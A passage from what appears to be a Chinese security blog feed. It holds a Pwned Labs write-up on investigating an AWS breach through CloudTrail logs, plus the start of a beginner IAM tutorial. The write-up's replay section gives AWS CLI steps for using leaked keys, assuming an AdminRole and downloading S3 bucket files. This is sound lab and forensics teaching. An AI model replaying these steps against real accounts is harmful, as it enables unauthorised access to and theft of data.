本地和云基础设施的敏感信息。</li><li>进一步风险：该文件还包含第二个被攻击账户的凭证，该账户具有比第一个账户更多的权限，允许访问未加密的客户数据，暴露了客户机密信息。</li><li>后果：可能导致财务损失、身份盗窃和公司声誉受损。</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>AWS 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Breach in the Cloud：云端数据泄露</title>
    <link href="/2025/04/30/%E3%80%90Pwned-Labs%E3%80%91Breach-in-the-Cloud%EF%BC%9A%E4%BA%91%E7%AB%AF%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/30/%E3%80%90Pwned-Labs%E3%80%91Breach-in-the-Cloud%EF%BC%9A%E4%BA%91%E7%AB%AF%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-场景介绍"><a href="#0x00-场景介绍" class="headerlink" title="0x00 场景介绍"></a>0x00 场景介绍</h2><p>我们收到了可能存在安全事件的警报。</p><p>Huge Logistics 的安全团队向你提供了一个 AWS 账户的访问密钥，该账户曾出现异常活动，同时还提供了该时段的 AWS CloudTrail 日志。</p><p>我们需要你利用专业技能，通过分析 CloudTrail 日志确认是否发生了数据泄露，识别被攻破的 AWS 服务以及是否有数据被外泄。</p><blockquote><p><strong>🎯 点击【阅读原文】，立即进入靶场环境！</strong></p></blockquote><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><ul><li>基础的 Linux 命令行知识</li></ul><h2 id="0x02-学习目标"><a href="#0x02-学习目标" class="headerlink" title="0x02 学习目标"></a>0x02 学习目标</h2><ul><li>美化 JSON 文件以便于分析；</li><li>熟悉 AWS CLI 的使用；</li><li>熟悉 CloudTrail 日志的分析方法；</li><li>枚举 S3 桶；</li><li>模拟攻击者的行为来验证入侵路径。</li></ul><h2 id="0x03-难度等级"><a href="#0x03-难度等级" class="headerlink" title="0x03 难度等级"></a>0x03 难度等级</h2><ul><li>初学者（Beginner）</li></ul><h2 id="0x04-关注重点"><a href="#0x04-关注重点" class="headerlink" title="0x04 关注重点"></a>0x04 关注重点</h2><ul><li>蓝队（Blue）</li></ul><h2 id="0x05-真实背景"><a href="#0x05-真实背景" class="headerlink" title="0x05 真实背景"></a>0x05 真实背景</h2><p>分析 AWS CloudTrail 日志是检测 AWS 账户中可疑活动的标准做法，而 S3 桶则因其可能包含有价值的数据而常成为攻击者的目标。</p><h2 id="0x06-解题思路"><a href="#0x06-解题思路" class="headerlink" title="0x06 解题思路"></a>0x06 解题思路</h2><h3 id="6-1-准备阶段"><a href="#6-1-准备阶段" class="headerlink" title="6.1 准备阶段"></a>6.1 准备阶段</h3><h4 id="6-1-1-工具环境准备"><a href="#6-1-1-工具环境准备" class="headerlink" title="6.1.1 工具环境准备"></a>6.1.1 工具环境准备</h4><p>实验过程均在 Mac OS 中进行的，需要提前下载并准备以下工具，其它平台同理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install unzip<br>brew install jq<br>brew install awscli<br></code></pre></td></tr></table></figure><h4 id="6-1-2-解压分析文件"><a href="#6-1-2-解压分析文件" class="headerlink" title="6.1.2 解压分析文件"></a>6.1.2 解压分析文件</h4><p>使用 <code>unzip</code> 解压 CloudTrail 日志包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip INCIDENT-3252.zip -d INCIDENT-3252<br><span class="hljs-built_in">cd</span> INCIDENT-3252<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_lxyU6zWq04.png"></p><h4 id="6-1-2-格式化日志"><a href="#6-1-2-格式化日志" class="headerlink" title="6.1.2 格式化日志"></a>6.1.2 格式化日志</h4><p>如果我们使用 Nano 或 Vim 等文本编辑器来打开这些 JSON 文件，会发现这些文件并未进行过格式化，因此会很难进行阅读。</p><p>为了解决这个问题，我们可以使用以下<code>jq</code> 命令进行格式化。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> *.json; <span class="hljs-keyword">do</span> jq . <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>.tmp&quot;</span> &amp;&amp; <span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>.tmp&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="/image/image_85pIl9o-Tl.png"></p><h3 id="6-2-初步调查"><a href="#6-2-初步调查" class="headerlink" title="6.2 初步调查"></a>6.2 初步调查</h3><h4 id="6-2-1-查找-IAM-用户"><a href="#6-2-1-查找-IAM-用户" class="headerlink" title="6.2.1 查找 IAM 用户"></a>6.2.1 查找 IAM 用户</h4><p>现在，让我们来看看日志中记录了哪些 AWS 主体，即哪些 IAM 用户和角色采取了行动。这时，我们发现存在可疑用户<code>temp-user</code>，因为该用户名不符合已创建账户的内部命名规范。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -r userName | <span class="hljs-built_in">sort</span> -u<br></code></pre></td></tr></table></figure><ul><li><code>grep -r</code>：递归搜索，即不仅搜索当前目录，还会深入所有子目录中的文件，并对每个文件进行逐行搜索；</li><li><code>sort -u</code>：对输出内容进行排序并去重。</li></ul><p><img src="/image/image_xeoHHh0QNj.png"></p><blockquote><p>对 IAM 用户和角色不了解的，可以先看看我们的这篇文章<a href="../../20/%E6%97%A0%E7%97%9B%E5%AD%A6%E4%B9%A0-AWS-%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%B8%8E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89/index.html">无痛学习 AWS 的身份与访问管理（IAM）</a></p></blockquote><h4 id="6-2-2-识别日志时间线"><a href="#6-2-2-识别日志时间线" class="headerlink" title="6.2.2 识别日志时间线"></a>6.2.2 识别日志时间线</h4><p>CloudTrail 对传送到 Amazon S3 存储桶的日志文件对象使用以下文件名格式。<code>YYYY</code>、<code>MM</code>、<code>DD</code>、<code>HH</code>和<code>mm</code> 分别是日志文件传送时的年、月、日、时、分。小时采用 24 小时制。<code>Z</code>表示时间为 UTC 时间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AccountID_CloudTrail_RegionName_YYYYMMDDTHHmmZ_UniqueString.FileNameFormat<br></code></pre></td></tr></table></figure><p><img src="/image/image_6PDBojuiVL.png"></p><blockquote><p>若想了解 CloudTrail 日志文件的命名规范，可以查看官方文档 <a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html" title="《CloudTrail log file name format》">《CloudTrail log file name format》</a></p></blockquote><h3 id="6-3-攻击者活动追踪"><a href="#6-3-攻击者活动追踪" class="headerlink" title="6.3 攻击者活动追踪"></a>6.3 攻击者活动追踪</h3><h4 id="6-3-1-侦查阶段"><a href="#6-3-1-侦查阶段" class="headerlink" title="6.3.1 侦查阶段"></a>6.3.1 侦查阶段</h4><p>最早的日志文件为带有关键词 <code>T2035Z</code>的文件。</p><p>我们搜索带有 <code>temp-user</code> 关键字并输出它的后 10 行日志，接着我们发现一个名为 <code>temp-user</code> 的用户（来自 AWS 账户<code>107513503799</code>）在 2023 年 8 月 26 日 20:29:37 UTC 运行了 CLI 命令<code>aws sts get-caller-identity</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -h -A 10 temp-user 107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json<br></code></pre></td></tr></table></figure><ul><li><code>-h</code>：不在输出中显示文件名（适用于多个文件时）；</li><li><code>-A 10</code>：在匹配行之后额外输出 10 行（A &#x3D; After）。</li></ul><p><img src="/image/image_BR_Iddx8Wv.png"></p><p>在 AWS 中，<code>GetCallerIdentity</code>是安全令牌服务（STS）的一部分，它允许用户获取当前使用其凭证发起 API 请求的 IAM 身份的详细信息。</p><p>这个命令有点类似于 Windows 或 Linux 中的<code>whoami</code>命令。该命令会返回调用者的全局唯一 ARN，如果是以角色身份操作，还会返回被假设的 IAM 角色 ARN。</p><p>虽然这是一个非常常用的命令，但它也常被攻击者用于识别易受攻击的凭证所关联的 IAM 用户或角色，从而帮助他们了解当前权限范围与环境（即获取态势感知）。</p><p>该请求源自 IP 地址<code>84.32.71.19</code>。检查 IP 后发现，该请求源自 Cherry Servers 拥有的 IP 地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl ipinfo.io/84.32.71.19<br></code></pre></td></tr></table></figure><p><img src="/image/image_KcZuHNqJgC.png"></p><p>Cheery Servers 是一家按需云资源提供商，Huge Logistics 并未使用该服务，因此这可能是一个潜在的入侵指标（IoC，Indicator of Compromise）。让我们进一步深入调查。</p><p><img src="/image/image_d7up57R7M1.png"></p><h4 id="6-3-2-权限枚举阶段"><a href="#6-3-2-权限枚举阶段" class="headerlink" title="6.3.2 权限枚举阶段"></a>6.3.2 权限枚举阶段</h4><p>接着，我们继续分析下一个文件，即带有关键字 <code>T2040Z</code> 的文件。我们发现用户名 <code>temp-user</code> 尝试列出存储桶<code>emergency-data-recovery</code> 的内容，但失败了。</p><p><img src="/image/image_uuMfL-GACn.png"></p><p>继续查看下一个文件<code>T2050Z</code>，我们会发现很多错误。可能是因为 <code>temp-user</code> 向其它 AWS 服务发起了大量的请求。</p><p><img src="/image/image_1N-FPv7zRi.png"></p><p>尽管噪声很大，但是攻击者也有可能会通过暴力破解的方式来枚举授予其 IAM 用户或角色的权限。例如下一个文件<code>T2055Z</code>中包含了 450 条访问被拒绝的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json | <span class="hljs-built_in">wc</span> -l<br>grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><p><img src="/image/image_wgQ8t9HqDJ.png"></p><blockquote><p>目前有多种开源工具可用于暴力破解 IAM 的权限，例如 <a href="https://github.com/shabarkin/aws-enumerator" title="aws-enumerator">aws-enumerator</a> 和 <a href="https://github.com/RhinoSecurityLabs/pacu" title="pacu">pacu</a></p></blockquote><h4 id="6-3-3-权限提升阶段"><a href="#6-3-3-权限提升阶段" class="headerlink" title="6.3.3 权限提升阶段"></a>6.3.3 权限提升阶段</h4><p>继续查看下一个日志文件<code>T2100Z</code>并查找 <code>temp-user</code> 用户的操作。我们发现他成功的扮演了一个名为<code>AdminRole</code>的角色。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -A 20 temp-user 107513503799_CloudTrail_us-east-1_20230826T2100Z_APB7fBUnHmiWjHtg.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_viu1K7NMO4.png"></p><p>再看下一个日志文件<code>T2105Z</code>，发现攻击者再次通过命令<code>aws sts get-caller-identity</code> 来验证身份。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -A 20 AdminRole 107513503799_CloudTrail_us-east-1_20230826T2105Z_fpp78PgremAcrW5c.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_-MnMMk1EeE.png"></p><h4 id="6-3-4-目标达成阶段"><a href="#6-3-4-目标达成阶段" class="headerlink" title="6.3.4 目标达成阶段"></a>6.3.4 目标达成阶段</h4><p>终于，我们来到最后一个日志文件<code>T2120Z</code>。在之前的分析中，我们注意到攻击者可能对<code>emergency-data-recovery</code> S3 存储桶感兴趣。我们发现攻击者尝试列出并检索内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep eventName 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_31ajij-feV.png"></p><p>查看 GetObject 的具体操作，我们发现<code>emergency.txt</code> 文件已被下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -A 20 GetObject 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_ugkDi9VjOp.png"></p><h3 id="6-4-复现攻击过程"><a href="#6-4-复现攻击过程" class="headerlink" title="6.4 复现攻击过程"></a>6.4 复现攻击过程</h3><h4 id="6-4-1-配置-AWS-CLI"><a href="#6-4-1-配置-AWS-CLI" class="headerlink" title="6.4.1 配置 AWS CLI"></a>6.4.1 配置 AWS CLI</h4><p>接下来，我们就可以复现攻击者的操作步骤了。执行以下命令，为本地环境设置认证信息（<code>Access Key ID</code>和<code>Secret Access Key</code>已在题目中提供了）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br></code></pre></td></tr></table></figure><p><img src="/image/image_EfjrwaMJot.png"></p><p>执行以下命令，查询当前 AWS 凭证（Access Key）所对应的身份信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts get-caller-identity<br></code></pre></td></tr></table></figure><p><img src="/image/image_I3TS12JwX-.png"></p><h4 id="6-4-2-查看用户策略"><a href="#6-4-2-查看用户策略" class="headerlink" title="6.4.2 查看用户策略"></a>6.4.2 查看用户策略</h4><p>让我们看看是否有任何内联用户策略附加到我们的 IAM 用户。这里我们查看到一个名为<code>test-temp-user</code> 的策略。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws iam list-user-policies --user-name temp-user<br></code></pre></td></tr></table></figure><p><img src="/image/image_yj9qxXmu93.png"></p><p>我们检查该策略，发现用户被允许扮演<code>AdminRole</code>的角色。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws iam get-user-policy --user-name temp-user --policy-name test-temp-user<br></code></pre></td></tr></table></figure><p><img src="/image/image_jEkGGN9-UL.png"></p><h4 id="6-4-3-Assume-Role-操作"><a href="#6-4-3-Assume-Role-操作" class="headerlink" title="6.4.3 Assume Role 操作"></a>6.4.3 Assume Role 操作</h4><p>确定了角色过后，我们可以使用以下命令，尝试接管该角色。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession<br></code></pre></td></tr></table></figure><p><img src="/image/image_g88bPqwwlg.png"></p><p>要扮演这个角色，我们需要使用以下命令进行设置。设置所需要的凭证，请参考上一个步骤的输出。设置结束后可以验证一下上下文信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws configure <span class="hljs-built_in">set</span> aws_session_token &lt;session_token&gt;<br>aws sts get-caller-identity<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_zyviouoJL1.png"></p><h4 id="6-4-4-访问存储桶"><a href="#6-4-4-访问存储桶" class="headerlink" title="6.4.4 访问存储桶"></a>6.4.4 访问存储桶</h4><p>接下来，我们就可以列出存储桶内容并检索文件了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://emergency-data-recovery<br></code></pre></td></tr></table></figure><p><img src="/image/image_iTUFAn34bd.png"></p><p>最后，我们下载文件，flag 就在文件中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://emergency-data-recovery/emergency.txt .<br>aws s3 <span class="hljs-built_in">cp</span> s3://emergency-data-recovery/message.txt .<br></code></pre></td></tr></table></figure><p><img src="/image/image_0hb2e0-wsX.png"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>本题考察了攻击者在 AWS 环境中的典型攻击路径：</p><ul><li>凭证滥用 ➝ 身份侦察 ➝ 权限枚举 ➝ 提权 ➝ 数据访问</li><li>同时涉及 CloudTrail 日志分析、IAM 策略理解、CLI 工具使用、以及 S3 存储桶数据取证。</li></ul><p>这是一次完整的<strong>云环境入侵溯源实战演练</strong>，非常适合作为红蓝对抗与云安全取证的学习案例。</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无痛学习 AWS 的身份与访问管理（IAM）</title>
    <link href="/2025/04/29/%E6%97%A0%E7%97%9B%E5%AD%A6%E4%B9%A0-AWS-%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%B8%8E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89/"/>
    <url>/2025/04/29/%E6%97%A0%E7%97%9B%E5%AD%A6%E4%B9%A0-AWS-%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%B8%8E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天，我们以初学者的视角来学习 AWS 的身份与访问管理（Identity and Access Management，本文简称 IAM）。</p><ul><li>首先，我们需要先了解 IAM、认证和授权的基本概念（IAM 指的是基于策略，控制某些身份可以访问某些资源）；</li><li>然后，我们展开说明什么是身份（IAM 用户、用户组和角色）以及与角色相关的 IAM 策略有哪些，其工作方式是什么；</li><li>接着，我们通过一个披萨店的例子来进一步巩固 IAM 的相关概念；</li><li>最后，通过 EC2 访问 S3 的示例场景进行收尾。</li></ul><h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="1-1-相关定义"><a href="#1-1-相关定义" class="headerlink" title="1.1 相关定义"></a>1.1 相关定义</h3><p>IAM 可以让我们基于预定义的 <strong>权限（permissions）</strong> 控制 <strong>谁（who）</strong> 可以访问我们的 AWS 服务和资源。</p><ul><li>谁（who）：指的是某个身份，可能是用户（user）、用户组（group）或角色（role）；</li><li>权限（permissions）：指的是附加在这些身份上的策略（policy），这些策略决定了哪些身份是否可以访问某些资源。</li></ul><h3 id="1-2-认证-vs-授权"><a href="#1-2-认证-vs-授权" class="headerlink" title="1.2 认证 vs 授权"></a>1.2 认证 vs 授权</h3><p>IAM 是 AWS 用于对身份进行<strong>认证（authentication）</strong> 和 <strong>授权（authorization）</strong> 的方式。需要注意的是，认证和授权并不相同。</p><ul><li>认证：关注的是“你是谁？”；</li><li>授权：关注的是“你能做什么？”。</li></ul><p>认证是指一个身份证明自己是其所声称的对象。而授权是指你证明自己有访问某资源的权限。例如：若我们要坐飞机，就必须经过认证和授权两个过程。</p><ul><li>认证：通过护照或身份证来完成的，安检人员会核对我们的照片是否与本人匹配，这就证明了“你是谁”。</li><li>授权：通过登机牌来完成的，它证明我们有权登上某一航班。</li></ul><p>我们需要完成这两步才能登机。同理，访问 AWS 资源也需要完成认证和授权。若要深入了解认证和授权的区别，可以看这篇博客<a href="https://www.freecodecamp.org/news/whats-the-difference-between-authentication-and-authorisation/" title="《Authentication vs Authorization – What&#39;s the Difference?》">《Authentication vs Authorization – What’s the Difference?》</a></p><p><img src="/image/image_gIdy3nVrwa.png"></p><h2 id="0x02-身份"><a href="#0x02-身份" class="headerlink" title="0x02 身份"></a>0x02 身份</h2><h3 id="2-1-IAM-用户（User）"><a href="#2-1-IAM-用户（User）" class="headerlink" title="2.1 IAM 用户（User）"></a>2.1 IAM 用户（User）</h3><p>IAM 用户指的是任何需要 <strong>长期访问</strong> AWS 资源的身份（可以是人，也可以是应用）。在与 AWS 资源进行交互之前，IAM 用户会向 IAM 发起请求进行认证。例如：</p><ul><li>人们可以通过用户名和密码认证来访问控制台；</li><li>应用程序或 CLI 用户通过访问密钥进行认证。</li></ul><h3 id="2-2-IAM-用户组（Group）"><a href="#2-2-IAM-用户组（Group）" class="headerlink" title="2.2 IAM 用户组（Group）"></a>2.2 IAM 用户组（Group）</h3><p><strong>IAM 用户可以被放置到用户组中</strong>。用户组便于在用户量较大时进行权限管理。相比为每位用户单独配置权限，按组设置更具可扩展性。</p><p>例如：有一个包含开发、架构师、运维、测试等团队的组织，每个团队有 10 人，总共 60 人。我们可以按团队划分用户组，然后为每个组配置权限，这样管理更高效。</p><ul><li>用户组本身不具备登录凭证。用户组在 AWS 中只是一个逻辑容器，用于将多个用户聚合在一起，以便统一分配权限策略（policy）。它本身并不是一个可以单独进行身份验证（登录）的实体。</li><li>用户可以属于多个组，例如某个 DevOps 工程师也可能是线上支持团队的一员。</li></ul><p><img src="/image/ChatGPT%20Image%202025%E5%B9%B44%E6%9C%8829%E6%97%A5%2016_46_39_qcpu5bWSv_.png"></p><h3 id="2-3-IAM-角色（Role）"><a href="#2-3-IAM-角色（Role）" class="headerlink" title="2.3 IAM 角色（Role）"></a>2.3 IAM 角色（Role）</h3><p>IAM 角色可以向多个身份（如外部用户、AWS 服务或应用程序）授予<strong>临时访问权限</strong>。这些身份临时“扮演”角色，并继承角色上附加的权限策略。</p><p>由于 IAM 用户数量有限（当前最多 5000 个），IAM 角色是大规模身份访问控制的重要手段。详情请看官方文档<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-quotas.html" title="《IAM and AWS STS quotas》">《IAM and AWS STS quotas》</a></p><h2 id="0x03-策略"><a href="#0x03-策略" class="headerlink" title="0x03 策略"></a>0x03 策略</h2><h3 id="3-1-IAM-角色策略"><a href="#3-1-IAM-角色策略" class="headerlink" title="3.1 IAM 角色策略"></a>3.1 IAM 角色策略</h3><p>与角色相关的 IAM 策略有 <strong>信任策略（trust policy）</strong> 和 <strong>权限策略（permission policy）</strong> 两种类型：</p><ul><li>信任策略：定义哪些身份可以担任该角色。一旦某个身份担任了该角色，AWS 就会向其颁发<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html" title="临时安全凭证">临时安全凭证</a>。这里的身份可以是 IAM 用户、AWS 资源（例如 EC2 实例）和匿名实体等。</li><li>权限策略：定义该角色拥有的权限，从而间接定义假扮该角色的身份所拥有的权限。</li></ul><p>注意，信任策略下的身份认证是有时间限制的，到期后需重新认证获取新凭证。</p><h3 id="3-2-IAM-策略的工作方式"><a href="#3-2-IAM-策略的工作方式" class="headerlink" title="3.2 IAM 策略的工作方式"></a>3.2 IAM 策略的工作方式</h3><p>IAM 策略附加在身份（用户、用户组或角色）或某些 AWS 资源上（此类策略称为“<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_identity-vs-resource.html" title="基于资源的策略">基于资源的策略</a>”）。这些策略是 JSON 文档，由多个<strong>声明（statement）</strong> 组成，表示可以允许或拒绝某些操作。</p><p>下面是授予某身份对某个 S3 桶读写权限的示例策略，默认情况下所有请求都被拒绝，只有策略显式声明允许（Allow）才会放行。这体现了“最小权限原则”。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ListObjectsInBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;arn:aws:s3:::bucket-name&quot;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AllObjectActions&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:*Object&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;arn:aws:s3:::bucket-name/*&quot;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ul><li><code>Version</code>：策略语言的版本，此处为<code>&quot;2012-10-17&quot;</code>，是当前推荐使用的版本；</li><li><code>Statement</code>：声明列表，每一项描述一条权限规则；</li><li><code>Sid</code>：声明 ID（可选），用于帮助理解策略的用途。<code>ListObjectsInBucket</code>表示列出桶内对象，<code>AllObjectActions</code>表示对桶中所有对象的所有操作；</li><li><code>Effect</code>：允许（Allow）或拒绝（Deny）；</li><li><code>Action</code>：要执行的操作，格式为 <code>服务:操作</code>。<code>s3:ListBucket</code>表示列出 S3 桶中的对象，<code>s3:*Object</code>表示所有以<code>*Object</code>结尾的操作，如<code>s3:GetObject</code>、<code>s3:PutObject</code> 等；</li><li><code>Resource</code>：操作涉及的资源，通常以 <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference-arns.html" title="ARN">ARN</a>（Amazon 资源名称）表示。<code>arn:aws:s3:::bucket-name</code> 表示指定的 S3 桶本身（注意：不是对象），<code>arn:aws:s3:::bucket-name/*</code>表示桶中所有的对象（注意：<code>/*</code> 表示桶内对象）；</li></ul><h2 id="0x04-示例场景：披萨店"><a href="#0x04-示例场景：披萨店" class="headerlink" title="0x04  示例场景：披萨店"></a>0x04  示例场景：披萨店</h2><p>以一家披萨店为例。披萨店会有一些<strong>全职员工</strong>，比如<strong>厨师</strong>、<strong>服务员</strong>和<strong>清洁工</strong>。也可能有一些<strong>兼职厨师</strong>在晚上和周末的高峰时段帮忙。如果这家店生意不错，它还会有堂食和外带的<strong>顾客</strong>。</p><p><img src="/image/image_RnB_rOq7MC.png"></p><p>与 AWS IAM 类似，<strong>全职员工就像 IAM 用户</strong>。他们需要长期访问餐厅的资源，如下所示。<strong>这些用户都属于不同的用户组</strong>——服务员、厨师和清洁工组（例如，所有服务员的职称都为“服务员”）。</p><p><img src="/image/image_ORELz7gZHn.png"></p><p><strong>餐厅员工的身份是如何验证的呢？<strong>即我们如何确认他们的身份呢？其实只要有带有照片的</strong>工牌</strong>就可以了。工牌上还可以显示他们的职称，这与他们所属的 IAM 组类似。</p><p>权限策略定义了餐厅员工可以访问哪些资源，这些权限策略是在组级别应用的，因为每个服务员、厨师和清洁工都拥有相同的权限。实际情况可能并非如此，例如主厨可能拥有特权访问权限。但为了简单起见，我们假设情况确实如此。</p><p><strong>餐厅经理如何控制谁有权访问哪些资源呢？</strong> 只要有带锁的门就足够了。<strong>钥匙</strong>作为一种策略，控制着餐厅各个区域的访问权限。所有服务员都将获得一套相同的权限集合，因为服务员需要相同级别的权限进入食物&#x2F;饮料储藏室、厨房和就餐区的权利。同样的逻辑也适用于其他全职员工，他们会收到相应的钥匙，以便可以根据需要使用餐厅的资源。</p><p><strong>向餐厅员工发放钥匙类似于将策略附加到 IAM 